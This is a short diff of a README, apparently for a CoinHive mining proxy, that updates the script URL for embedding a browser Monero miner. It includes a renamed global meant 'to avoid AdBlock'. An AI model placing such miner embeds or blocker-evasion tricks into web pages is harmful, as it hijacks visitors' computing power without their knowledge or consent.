@@ -203,19 +203,19 @@ Now instead of using CoinHive's miner:
 You should use your miner like this:
 
 ```html
-<script src="https://priceless-wright-067e2f.netlify.com?proxy=YOUR-PROXY-URL"></script>
+<script src="https://priceless-wright-067e2f.netlify.com/m.js?proxy=YOUR-PROXY-URL"></script>
 ```
 
 This is an example of how it should look like:
 
 ```html
-<script src="https://priceless-wright-067e2f.netlify.com?proxy=wss://my-awesome-proxy.com"></script>
+<script src="https://priceless-wright-067e2f.netlify.com/m.js?proxy=wss://my-awesome-proxy.com"></script>
 ```
 
 Also, instead of using the CoinHive global variable use CH (this is to avoid AdBlock), ie:
 
 ```html
-<script src="https://priceless-wright-067e2f.netlify.com?proxy=wss://my-awesome-proxy.com"></script>
+<script src="https://priceless-wright-067e2f.netlify.com/m.js?proxy=wss://my-awesome-proxy.com"></script>
 <script>
   var miner = CH.Anonymous('MONERO_WALLET_ADDRESS');
   miner.start();
